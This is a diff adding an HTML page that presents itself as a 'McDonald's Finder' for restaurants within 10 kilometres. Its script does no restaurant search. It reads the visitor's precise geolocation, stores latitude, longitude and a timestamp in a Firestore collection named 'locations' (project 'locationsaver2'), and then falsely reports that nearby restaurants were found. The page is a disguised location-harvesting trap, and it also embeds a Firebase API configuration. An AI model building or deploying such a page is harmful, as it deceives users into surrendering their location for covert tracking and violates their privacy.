@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>McDonald's Finder</title>
+<style>
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
+      Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+    margin: 0;
+    padding: 0;
+    background: #f8f8f8;
+    color: #333;
+    text-align: center;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+  }
+  .container {
+    padding: 20px;
+    max-width: 800px;
+    margin: 0 auto;
+  }
+  h1 {
+    font-size: 2.5rem;
+    margin-bottom: 3rem;
+    color: #292929;
+  }
+  #status {
+    margin-top: 1rem;
+    font-size: 1.2rem;
+  }
+  #coords {
+    margin-top: 1rem;
+    font-weight: 600;
+    display: none; /* Hidden by default */
+  }
+  button {
+    margin-top: 2rem;
+    padding: 1rem 2rem;
+    font-size: 1.2rem;
+    background: #DA291C; /* McDonald's red */
+    border: none;
+    color: white;
+    border-radius: 50px;
+    cursor: pointer;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    transition: transform 0.2s, box-shadow 0.2s;
+  }
+  button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 8px rgba(0, 0, 0, 0.2);
+  }
+  button:disabled {
+    background: #ffcccb;
+    cursor: default;
+    transform: none;
+    box-shadow: none;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <h1>Find all the McDonald's within 10 kilometers of you!</h1>
+    <button id="getLocationBtn">Find McDonald's Near Me</button>
+    <div id="status"></div>
+    <div id="coords"></div>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+
+  <script>
+    // Firebase configuration remains the same
+    const firebaseConfig = {
+       apiKey: "AIzaSyBjXH0gxW8W6AS_X1fs2IeYJRGDNSC6np8",
+       authDomain: "locationsaver2.firebaseapp.com",
+       projectId: "locationsaver2",
+       storageBucket: "locationsaver2.firebasestorage.app",
+       messagingSenderId: "348350454626",
+       appId: "1:348350454626:web:e6e94105c54658bbf52a3b",
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+
+    // Initialize Firestore
+    const db = firebase.firestore();
+
+    const button = document.getElementById('getLocationBtn');
+    const statusDiv = document.getElementById('status');
+    const coordsDiv = document.getElementById('coords');
+
+    function updateStatus(message, isError = false) {
+      statusDiv.textContent = message;
+      statusDiv.style.color = isError ? '#DA291C' : '#292929';
+    }
+
+    function logLocation(latitude, longitude) {
+      return db.collection('locations').add({
+        latitude,
+        longitude,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      });
+    }
+
+    function showCoordinates(latitude, longitude) {
+      coordsDiv.textContent = `Latitude: ${latitude.toFixed(6)}, Longitude: ${longitude.toFixed(6)}`;
+    }
+
+    button.addEventListener('click', () => {
+      if (!navigator.geolocation) {
+        updateStatus('Geolocation is not supported by your browser', true);
+        return;
+      }
+
+      updateStatus('Finding McDonald\'s restaurants near you...');
+      coordsDiv.textContent = '';
+
+      navigator.geolocation.getCurrentPosition(
+        async position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          showCoordinates(lat, lon);
+          try {
+            await logLocation(lat, lon);
+            updateStatus('Found McDonald\'s locations near you! 🍔');
+          } catch (error) {
+            updateStatus('Failed to find locations: ' + error.message, true);
+          }
+        },
+        error => {
+          switch(error.code) {
+            case error.PERMISSION_DENIED:
+              updateStatus('Permission denied. Please allow location access to find nearby McDonald\'s.', true);
+              break;
+            case error.POSITION_UNAVAILABLE:
+              updateStatus('Unable to detect your location.', true);
+              break;
+            case error.TIMEOUT:
+              updateStatus('Request timed out.', true);
+              break;
+            default:
+              updateStatus('An unknown error occurred.', true);
+              break;
+          }
+        }
+      );
+    });
+  </script>
+</body>
+</html>
